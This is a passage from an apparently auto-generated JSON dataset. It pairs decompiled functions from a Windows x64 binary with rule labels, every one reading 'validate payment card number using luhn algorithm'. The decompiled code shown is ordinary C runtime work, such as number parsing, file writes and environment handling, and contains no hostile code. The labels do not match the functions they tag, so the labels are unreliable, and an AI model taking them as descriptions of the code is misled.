        "decompiled_code": "\ncode ** fcn.140004cec(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.140007678(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::runtime_error.0;\n    return arg1;\n}\n",
        "token_count": 114
    },
    "14000bf5": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14000bf58(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    \n    iVar3 = fcn.14000bca0(in_stack_00000030);\n    if (((iVar3 == 0) || (*(iVar3 + 0x3b8) == 0)) &&\n       (puVar4 = fcn.14000bd0c(0x14003fdf0, in_stack_00000030),  uVar2 = *0x14003e020 & 0x3f, \n       ((*0x14003e020 ^ *puVar4) >> uVar2 | (*0x14003e020 ^ *puVar4) << 0x40 - uVar2) == 0)) {\n        fcn.14000c078(arg1, arg2, arg3, arg4, in_stack_00000028);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    (**0x14002b348)(arg1, arg2, arg3, arg4, in_stack_00000028);\n    return;\n}\n",
        "token_count": 298
    },
    "14000c63": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t fcn.14000c63c(int64_t arg1, char **arg2, ulong arg3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    char cVar10;\n    uint32_t uVar11;\n    char *pcVar12;\n    uint32_t in_R9D;\n    uint32_t uVar13;\n    \n    pcVar2 = *arg2;\n    uVar9 = arg3;\n    if (pcVar2 == NULL) {\n        puVar6 = fcn.140012c78();\n        *puVar6 = 0x16;\n        fcn.14000c028();\ncode_r0x00014000c6ae:\n        if (arg2[1] != NULL) {\n            *arg2[1] = *arg2;\n        }\n        return 0;\n    }\n    if ((arg3 != 0) && (0x22 < arg3 - 2)) {\n        *(arg1 + 0x30) = 1;\n        *(arg1 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        goto code_r0x00014000c6ae;\n    }\n    cVar10 = *pcVar2;\n    pcVar12 = pcVar2 + 1;\n    uVar11 = in_R9D & 0xff;\n    *arg2 = pcVar12;\n    uVar13 = uVar11 | 2;\n    if ((cVar10 == '-') || (uVar13 = uVar11,  cVar10 == '+')) {\n        uVar11 = uVar13;\n        cVar10 = *pcVar12;\n        pcVar12 = pcVar2 + 2;\n        *arg2 = pcVar12;\n    }\n    if ((arg3 == 0) || (uVar7 = uVar9,  arg3 == 0x10)) {\n        if (cVar10 - 0x30U < 10) {\n            iVar4 = cVar10 + -0x30;\ncode_r0x00014000c735:\n            if (iVar4 == 0) {\n                cVar1 = *pcVar12;\n                *arg2 = pcVar12 + 1;\n                if ((cVar1 + 0xa8U & 0xdf) == 0) {\n                    cVar10 = pcVar12[1];\n                    pcVar12 = pcVar12 + 2;\n                    *arg2 = pcVar12;\n                    uVar7 = 0x10;\n                    if (arg3 != 0) {\n                        uVar7 = uVar9;\n                    }\n                }\n                else {\n                    *arg2 = pcVar12;\n                    uVar7 = 8;\n                    if (arg3 != 0) {\n                        uVar7 = uVar9;\n                    }\n                    if ((cVar1 != '\\0') && (*pcVar12 != cVar1)) {\n                        puVar6 = fcn.140012c78();\n                        *puVar6 = 0x16;\n                        fcn.14000c028();\n                        pcVar12 = *arg2;\n                    }\n                }\n                goto code_r0x00014000c798;\n            }\n        }\n        else {\n            if (cVar10 + 0x9fU < 0x1a) {\n                iVar4 = cVar10 + -0x57;\n                goto code_r0x00014000c735;\n            }\n            if (cVar10 + 0xbfU < 0x1a) {\n                iVar4 = cVar10 + -0x37;\n                goto code_r0x00014000c735;\n            }\n        }\n        uVar7 = 10;\n        if (arg3 != 0) {\n            uVar7 = uVar9;\n        }\n    }\ncode_r0x00014000c798:\n    uVar13 = 0;\n    while( true ) {\n        if (cVar10 - 0x30U < 10) {\n            uVar8 = cVar10 - 0x30;\n        }\n        else if (cVar10 + 0x9fU < 0x1a) {\n            uVar8 = cVar10 - 0x57;\n        }\n        else if (cVar10 + 0xbfU < 0x1a) {\n            uVar8 = cVar10 - 0x37;\n        }\n        else {\n            uVar8 = 0xffffffff;\n        }\n        if (uVar7 <= uVar8) break;\n        cVar10 = *pcVar12;\n        uVar5 = uVar13 * uVar7;\n        uVar8 = uVar5 + uVar8;\n        uVar11 = uVar11 | (uVar8 < uVar5 || 0xffffffff / uVar7 < uVar13) << 2 | 8;\n        pcVar12 = pcVar12 + 1;\n        *arg2 = pcVar12;\n        uVar13 = uVar8;\n    }\n    *arg2 = pcVar12 + -1;\n    if ((cVar10 != '\\0') && (pcVar12[-1] != cVar10)) {\n        puVar6 = fcn.140012c78();\n        *puVar6 = 0x16;\n        fcn.14000c028();\n    }\n    if ((uVar11 & 8) == 0) {\n        *arg2 = pcVar2;\n        if (arg2[1] == NULL) {\n            return 0;\n        }\n        *arg2[1] = pcVar2;\n        return 0;\n    }\n    if ((uVar11 & 4) == 0) {\n        if ((uVar11 & 1) == 0) {\n            if ((uVar11 & 2) == 0) goto code_r0x00014000c8bb;\ncode_r0x00014000c8b8:\n            uVar13 = -uVar13;\n            goto code_r0x00014000c8bb;\n        }\n        if ((uVar11 & 2) == 0) {\n            if (uVar13 < 0x80000000) goto code_r0x00014000c8bb;\n        }\n        else if (uVar13 < 0x80000001) goto code_r0x00014000c8b8;\n    }\n    *(arg1 + 0x30) = 1;\n    *(arg1 + 0x2c) = 0x22;\n    if ((uVar11 & 1) != 0) {\n        ppcVar3 = arg2[1];\n        if ((uVar11 & 2) == 0) {\n            if (ppcVar3 != NULL) {\n                *ppcVar3 = *arg2;\n            }\n            return 0x7fffffff;\n        }\n        if (ppcVar3 != NULL) {\n            *ppcVar3 = *arg2;\n        }\n        return 0x80000000;\n    }\n    uVar13 = 0xffffffff;\ncode_r0x00014000c8bb:\n    if (arg2[1] != NULL) {\n        *arg2[1] = *arg2;\n        return uVar13;\n    }\n    return uVar13;\n}\n",
        "token_count": 1655
    },
    "14000e47": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.14000e47c(int64_t arg1, uint *arg2)\n\n{\n    int64_t arg1_00;\n    ulong uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    uint8_t uVar4;\n    uint64_t uStackX8;\n    uint64_t uStack24;\n    uint64_t *puStack16;\n    \n    arg1_00 = *(arg1 + 8);\n    puStack16 = &uStackX8;\n    uStackX8 = *(arg1 + 0x10) - 1;\n    uVar1 = *(arg1_00 + 0x2c);\n    uStack24 = uStackX8;\n    uVar2 = fcn.14000c63c(arg1_00, &uStack24, 10);\n    *arg2 = uVar2;\n    uVar3 = *(arg1 + 8);\n    if (((*(uVar3 + 0x30) == '\\0') || (uVar4 = 0,  *(uVar3 + 0x2c) != 0x22)) &&\n       (uVar3 = uStackX8,  uVar4 = 0,  *(arg1 + 0x10) <= uStackX8)) {\n        *(arg1 + 0x10) = uStackX8;\n        uVar4 = 1;\n    }\n    *(arg1_00 + 0x2c) = uVar1;\n    return uVar3 & 0xffffffffffffff00 | uVar4;\n}\n",
        "token_count": 347
    },
    "14000e50": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.14000e50c(int64_t arg1, uint *arg2)\n\n{\n    int64_t arg1_00;\n    ulong uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    uint8_t uVar4;\n    uint64_t uStackX8;\n    uint64_t uStack24;\n    uint64_t *puStack16;\n    \n    arg1_00 = *(arg1 + 8);\n    puStack16 = &uStackX8;\n    uStackX8 = *(arg1 + 0x10) - 2;\n    uVar1 = *(arg1_00 + 0x2c);\n    uStack24 = uStackX8;\n    uVar2 = fcn.14000c8ec(arg1_00, &uStack24, 10);\n    *arg2 = uVar2;\n    uVar3 = *(arg1 + 8);\n    if (((*(uVar3 + 0x30) == '\\0') || (uVar4 = 0,  *(uVar3 + 0x2c) != 0x22)) &&\n       (uVar3 = uStackX8,  uVar4 = 0,  *(arg1 + 0x10) <= uStackX8)) {\n        *(arg1 + 0x10) = uStackX8;\n        uVar4 = 1;\n    }\n    *(arg1_00 + 0x2c) = uVar1;\n    return uVar3 & 0xffffffffffffff00 | uVar4;\n}\n",
        "token_count": 347
    },
    "1400106e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.1400106ec(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    \n    if (arg1 == 0) {\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    else {\n        if ((*(arg1 + 0x14) >> 0xc & 1) == 0) {\n            fcn.14000c298(arg1);\n            uVar1 = fcn.140010768(arg1, arg2);\n            fcn.14000c2a4(arg1);\n            return uVar1;\n        }\n        fcn.14001bf4c(arg1);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 190
    },
    "14001076": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.140010768(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg1 == 0) {\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = 0xffffffff;\n        if ((*(arg1 + 0x14) >> 0xd & 1) != 0) {\n            uVar1 = fcn.140010ac0(arg1, arg2);\n            fcn.14001a688(arg1);\n            uVar2 = fcn.14001bbb4(arg1);\n            iVar3 = fcn.14001bdb8(uVar2, arg2);\n            if (iVar3 < 0) {\n                uVar1 = 0xffffffff;\n            }\n            else if (*(arg1 + 0x28) != 0) {\n                fcn.140019b4c(*(arg1 + 0x28));\n                *(arg1 + 0x28) = 0;\n            }\n        }\n        fcn.14001bf4c(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 309
    },
    "1400116c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.1400116c4(ulong *arg1)\n\n{\n    ulong arg3;\n    ulong arg1_00;\n    uint8_t uVar1;\n    ulong uVar2;\n    uint64_t arg1_01;\n    \n    arg3 = arg1[1];\n    arg1_00 = **arg1;\n    uVar1 = fcn.14001bc3c(arg1_00);\n    arg1_01 = *arg1[2];\n    uVar2 = fcn.1400117e0(arg1_01, *arg1[3], *arg1[4], **arg1);\n    fcn.14001bd04(arg1_01 & 0xffffffffffffff00 | uVar1, arg1_00, arg3);\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "1400117e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.1400117e0(char *arg1, uint64_t arg2, uint64_t arg3, int64_t *arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    int64_t in_stack_00000028;\n    \n    if ((arg2 != 0) && (arg3 != 0)) {\n        if ((arg4 != NULL) &&\n           ((arg1 != NULL && (arg3 <= SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(arg2), 0)))))\n        {\n            if ((*(arg4 + 0x14) & 0x4c0) == 0) {\n                uVar7 = 0x1000;\n            }\n            else {\n                uVar7 = *(arg4 + 4);\n            }\n            uVar6 = arg2 * arg3;\n            do {\n                if (uVar6 == 0) {\n                    return arg3;\n                }\n                if (((*(arg4 + 0x14) & 0xc0) == 0) || (*(arg4 + 2) == 0)) {\n                    if (uVar7 <= uVar6) {\n                        if (((*(arg4 + 0x14) & 0xc0) != 0) &&\n                           (iVar1 = fcn.140010ac0(arg4, in_stack_00000028),  iVar1 != 0)) goto code_r0x00014001198c;\n                        uVar3 = uVar6;\n                        if (uVar7 != 0) {\n                            uVar3 = uVar6 - uVar6 % uVar7;\n                        }\n                        uVar5 = 0xfffffffe;\n                        if (uVar3 < 0xfffffffe) {\n                            uVar5 = uVar3;\n                        }\n                        uVar2 = fcn.14001bbb4(arg4);\n                        uVar2 = fcn.14001c8a4(uVar2, arg1, uVar5, in_stack_00000028);\n                        if (uVar2 != 0xffffffff) {\n                            uVar4 = uVar2;\n                            if (uVar5 < uVar2) {\n                                uVar4 = uVar5;\n                            }\n                            uVar3 = uVar4;\n                            uVar6 = uVar6 - uVar3;\n                            if (uVar5 <= uVar2) goto code_r0x0001400119ca;\n                        }\ncode_r0x000140011987:\n                        LOCK();\n                        *(arg4 + 0x14) = *(arg4 + 0x14) | 0x10;\ncode_r0x00014001198c:\n                        return (arg2 * arg3 - uVar6) / arg2;\n                    }\n                    iVar1 = fcn.14001d54c(*arg1, arg4, in_stack_00000028);\n                    if (iVar1 == -1) goto code_r0x00014001198c;\n                    uVar7 = *(arg4 + 4);\n                    uVar6 = uVar6 - 1;\n                    uVar3 = 1;\n                    if (uVar7 < 1) {\n                        uVar7 = 1;\n                    }\n                }\n                else {\n                    if (*(arg4 + 2) < 0) goto code_r0x000140011987;\n                    if ((*(arg4 + 0x14) & 1) != 0) goto code_r0x00014001198c;\n                    uVar3 = uVar6;\n                    if (*(arg4 + 2) <= uVar6) {\n                        uVar3 = *(arg4 + 2);\n                    }\n                    fcn.140007990(*arg4, arg1, uVar3);\n                    *(arg4 + 2) = *(arg4 + 2) - uVar3;\n                    uVar6 = uVar6 - uVar3;\n                    *arg4 = *arg4 + uVar3;\n                }\ncode_r0x0001400119ca:\n                arg1 = arg1 + uVar3;\n            } while( true );\n        }\n        *(in_stack_00000028 + 0x30) = 1;\n        *(in_stack_00000028 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    return 0;\n}\n",
        "token_count": 1010
    },
    "140016a5": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140016a50(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    ulong in_R9;\n    int64_t aiStackX16 [3];\n    \n    aiStackX16[0] = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(0, L\"mscoree.dll\", aiStackX16, in_R9, 0xfffffffffffffffe);\n    if ((iVar2 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(aiStackX16[0], \"CorExitProcess\"),  iVar1 != 0))\n    {\n        (**0x14002b348)(arg1);\n    }\n    if (aiStackX16[0] != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "14001a5d": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.14001a5d4(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t iStack24;\n    \n    iStack24 = 0;\n    fcn.140011ea4(8);\n    for (iVar3 = 3; iVar3 != *0x14003fdf8; iVar3 = iVar3 + 1) {\n        iVar4 = iVar3;\n        iVar1 = *(*0x14003fe00 + iVar4 * 8);\n        if (iVar1 != 0) {\n            if (((*(iVar1 + 0x14) >> 0xd & 1) != 0) &&\n               (iVar2 = fcn.14001080c(*(*0x14003fe00 + iVar4 * 8)),  iVar2 != -1)) {\n                iStack24 = iStack24 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(*(*0x14003fe00 + iVar4 * 8) + 0x30);\n            fcn.140019b4c(*(*0x14003fe00 + iVar4 * 8));\n            *(*0x14003fe00 + iVar4 * 8) = 0;\n        }\n    }\n    fcn.140011ef8(8);\n    return iStack24;\n}\n",
        "token_count": 308
    },
    "14001ce4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.14001ce48(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar1 = 0xffffffffffffffff;\n    }\n    else {\n        fcn.14000c298(arg1);\n        uVar1 = fcn.14001ceb4(arg1, arg2);\n        fcn.14000c2a4(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "14001e14": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.14001e14c(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t aiStack24 [2];\n    \n    iVar4 = fcn.140022480(arg1 & 0xffffffff);\n    if (iVar4 == -1) {\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar4, arg2, aiStack24, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.140012c34(uVar3, arg4);\n        }\n        else if (aiStack24[0] != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return aiStack24[0];\n        }\n    }\n    return -1;\n}\n",
        "token_count": 303
    },
    "14001e3a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.14001e3ac(uint64_t *arg1, ushort *arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint uVar3;\n    uint64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar3 = 0;\n    if (arg2 == NULL) {\n        if (arg3 == 0) {\ncode_r0x00014001e41f:\n            if (arg1 != NULL) {\n                *arg1 = 0;\n            }\n            uVar2 = in_stack_00000028;\n            if (arg3 < in_stack_00000028) {\n                uVar2 = arg3;\n            }\n            if (uVar2 < 0x80000000) {\n                iVar1 = fcn.14001e4d0(arg2, arg4, uVar2, in_stack_00000030);\n                if (iVar1 == -1) {\n                    if (arg2 != NULL) {\n                        *arg2 = 0;\n                    }\n                    if (*(in_stack_00000030 + 0x30) == '\\0') {\n                        return 0;\n                    }\n                    return *(in_stack_00000030 + 0x2c);\n                }\n                uVar2 = iVar1 + 1;\n                if (arg2 == NULL) goto code_r0x00014001e4ac;\n                if (arg3 < uVar2) {\n                    if (in_stack_00000028 != 0xffffffffffffffff) {\n                        *arg2 = 0;\n                        uVar3 = 0x22;\n                        goto code_r0x00014001e48d;\n                    }\n                    uVar3 = 0x50;\n                    uVar2 = arg3;\n                }\n                arg2[uVar2 - 1] = 0;\ncode_r0x00014001e4ac:\n                if (arg1 == NULL) {\n                    return uVar3;\n                }\n                *arg1 = uVar2;\n                return uVar3;\n            }\n            uVar3 = 0x16;\ncode_r0x00014001e48d:\n            *(in_stack_00000030 + 0x2c) = uVar3;\n            *(in_stack_00000030 + 0x30) = 1;\n            goto code_r0x00014001e3fc;\n        }\n    }\n    else if (arg3 != 0) {\n        if (arg2 != NULL) {\n            *arg2 = 0;\n        }\n        goto code_r0x00014001e41f;\n    }\n    uVar3 = 0x16;\n    *(in_stack_00000030 + 0x30) = 1;\n    *(in_stack_00000030 + 0x2c) = 0x16;\ncode_r0x00014001e3fc:\n    fcn.14000bf58(0, 0, 0, 0);\n    return uVar3;\n}\n",
        "token_count": 667
    },
    "14001e77": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.14001e774(uint64_t *arg1, uchar *arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint uVar3;\n    uint64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar3 = 0;\n    if (arg2 == NULL) {\n        if (arg3 != 0) goto code_r0x00014001e7ae;\n    }\n    else {\n        if (arg3 == 0) {\ncode_r0x00014001e7ae:\n            uVar3 = 0x16;\n            *(in_stack_00000030 + 0x30) = 1;\n            *(in_stack_00000030 + 0x2c) = 0x16;\n            goto code_r0x00014001e7c4;\n        }\n        *arg2 = 0;\n    }\n    if (arg1 != NULL) {\n        *arg1 = 0;\n    }\n    uVar2 = in_stack_00000028;\n    if (arg3 < in_stack_00000028) {\n        uVar2 = arg3;\n    }\n    if (0x7fffffff < uVar2) {\n        uVar3 = 0x16;\ncode_r0x00014001e852:\n        *(in_stack_00000030 + 0x2c) = uVar3;\n        *(in_stack_00000030 + 0x30) = 1;\ncode_r0x00014001e7c4:\n        fcn.14000bf58(0, 0, 0, 0);\n        return uVar3;\n    }\n    iVar1 = fcn.14001e894(arg2, arg4, uVar2, in_stack_00000030);\n    if (iVar1 == -1) {\n        if (arg2 != NULL) {\n            *arg2 = 0;\n        }\n        if (*(in_stack_00000030 + 0x30) == '\\0') {\n            return 0;\n        }\n        return *(in_stack_00000030 + 0x2c);\n    }\n    uVar2 = iVar1 + 1;\n    if (arg2 == NULL) goto code_r0x00014001e870;\n    if (arg3 < uVar2) {\n        if (in_stack_00000028 != 0xffffffffffffffff) {\n            *arg2 = 0;\n            uVar3 = 0x22;\n            goto code_r0x00014001e852;\n        }\n        uVar3 = 0x50;\n        uVar2 = arg3;\n    }\n    arg2[uVar2 - 1] = 0;\ncode_r0x00014001e870:\n    if (arg1 == NULL) {\n        return uVar3;\n    }\n    *arg1 = uVar2;\n    return uVar3;\n}\n",
        "token_count": 649
    },
    "14002219": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.140022190(uint64_t arg1, ulong arg2)\n\n{\n    uint64_t arg2_00;\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    \n    uVar9 = 0;\n    if (arg1 == 0) {\n        puVar4 = fcn.140012c78();\n        *puVar4 = 0x16;\n        return 0xffffffffffffffff;\n    }\n    uVar5 = fcn.140029a6c(arg1, 0x3d);\n    if ((uVar5 == 0) || (uVar5 == arg1)) {\n        puVar4 = fcn.140012c78();\n        *puVar4 = 0x16;\n        fcn.140019b4c(arg1);\n        return 0xffffffffffffffff;\n    }\n    cVar1 = *(uVar5 + 1);\n    if (*0x140040178 == *0x140040190) {\n        *0x140040178 = fcn.1400220a8(*0x140040178);\n    }\n    if (*0x140040178 == NULL) {\n        if ((arg2 == 0) || (*0x140040180 == 0)) {\n            if (cVar1 == '\\0') goto code_r0x000140021e06;\n            *0x140040178 = fcn.140019ad4(1, 8);\n            fcn.140019b4c(0);\n            if (*0x140040178 != NULL) {\n                if (*0x140040180 == 0) {\n                    *0x140040180 = fcn.140019ad4(1, 8);\n                    fcn.140019b4c(0);\n                    if (*0x140040180 == 0) goto code_r0x000140021e02;\n                }\ncode_r0x000140021ea1:\n                if (*0x140040178 != NULL) goto code_r0x000140021eaa;\n            }\n        }\n        else {\n            iVar6 = fcn.1400166bc();\n            if (iVar6 != 0) {\n                if (*0x140040178 == *0x140040190) {\n                    *0x140040178 = fcn.1400220a8(*0x140040178);\n                }\n                goto code_r0x000140021ea1;\n            }\n            puVar4 = fcn.140012c78();\n            *puVar4 = 0x16;\n        }\n    }\n    else {\ncode_r0x000140021eaa:\n        piVar7 = *0x140040178;\n        iVar11 = uVar5 - arg1;\n        iVar6 = **0x140040178;\n        piVar8 = *0x140040178;\n        while (iVar6 != 0) {\n            iVar3 = fcn.140027b4c(arg1, iVar6, iVar11);\n            if ((iVar3 == 0) && ((*(iVar11 + *piVar8) == '=' || (*(iVar11 + *piVar8) == '\\0')))) {\n                iVar6 = piVar8 - piVar7 >> 3;\n                goto code_r0x000140021ef9;\n            }\n            piVar8 = piVar8 + 1;\n            iVar6 = *piVar8;\n        }\n        iVar6 = -(piVar8 - piVar7 >> 3);\ncode_r0x000140021ef9:\n        uVar10 = uVar9;\n        if ((-1 < iVar6) && (*piVar7 != 0)) {\n            fcn.140019b4c(piVar7[iVar6]);\n            if (cVar1 == '\\0') {\n                for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                    piVar7[iVar6] = piVar7[iVar6 + 1];\n                }\n                piVar7 = fcn.140024da8(piVar7, iVar6, 8);\n                fcn.140019b4c(0);\n                uVar10 = arg1;\n                if (piVar7 != NULL) {\n                    *0x140040178 = piVar7;\n                }\n            }\n            else {\n                piVar7[iVar6] = arg1;\n            }\ncode_r0x000140021fb8:\n            if (arg2 == 0) {\ncode_r0x000140022058:\n                fcn.140019b4c(uVar10);\n                return 0;\n            }\n            iVar6 = -1;\n            do {\n                iVar11 = iVar6;\n                iVar6 = iVar11 + 1;\n            } while (*(arg1 + iVar11 + 1) != '\\0');\n            iVar6 = fcn.140019ad4(iVar11 + 3, 1);\n            if (iVar6 == 0) {\n                fcn.140019b4c(0);\n            }\n            else {\n                iVar3 = fcn.140018aa0(iVar6, iVar11 + 3, arg1);\n                if (iVar3 != 0) {\n                    fcn.14000c078(0, 0, 0, 0, 0);\n                    pcVar2 = swi(3);\n                    uVar9 = (*pcVar2)();\n                    return uVar9;\n                }\n                uVar9 = uVar5 + 1 + (iVar6 - arg1);\n                *(uVar9 - 1) = 0;\n                iVar3 = fcn.140027c64(iVar6, -(cVar1 != '\\0') & uVar9);\n                if (iVar3 != 0) {\n                    fcn.140019b4c(iVar6);\n                    goto code_r0x000140022058;\n                }\n                puVar4 = fcn.140012c78();\n                *puVar4 = 0x2a;\n                fcn.140019b4c(iVar6);\n                uVar9 = 0xffffffff;\n            }\n            fcn.140019b4c(uVar10);\n            return uVar9;\n        }\n        if (cVar1 == '\\0') goto code_r0x000140021e06;\n        arg2_00 = -iVar6 + 2;\n        if ((-iVar6 <= arg2_00) && (arg2_00 < 0x1fffffffffffffff)) {\n            piVar7 = fcn.140024da8(piVar7, arg2_00, 8);\n            fcn.140019b4c(0);\n            if (piVar7 != NULL) {\n                piVar7[-iVar6] = arg1;\n                piVar7[1 - iVar6] = 0;\n                *0x140040178 = piVar7;\n                goto code_r0x000140021fb8;\n            }\n        }\n    }\ncode_r0x000140021e02:\n    uVar9 = 0xffffffffffffffff;\ncode_r0x000140021e06:\n    fcn.140019b4c(arg1);\n    return uVar9 & 0xffffffff;\n}\n",
        "token_count": 1616
    },
    "140024f4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
